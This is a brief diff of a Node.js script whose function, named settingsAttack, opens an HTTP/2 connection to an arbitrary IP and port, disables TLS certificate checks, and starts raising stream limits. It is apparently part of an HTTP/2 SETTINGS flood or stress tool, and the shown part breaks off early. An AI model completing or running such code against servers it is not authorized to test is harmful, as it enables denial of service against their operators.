@@ -1,12 +1,13 @@
 const http2 = require('http2');
 
 function settingsAttack(ip, port){
-  let address= 'https://'.concat(ip).concat(':').concat(port).concat('/');
+  let address= 'http://'.concat(ip).concat(':').concat(port).concat('/');
 
-  const client = http2.connect(address,{
+  const client = http2.connect(address/*,{
           requestCert: false, // put true if you want a client certificate, tested and it works
           rejectUnauthorized: false
-  });
+  }*/
+  );
 
   // Set the maximum values for MAX_CONCURRENT_STREAMS and INITIAL_WINDOW_SIZE
   client.settings.maxConcurrentStreams =100;
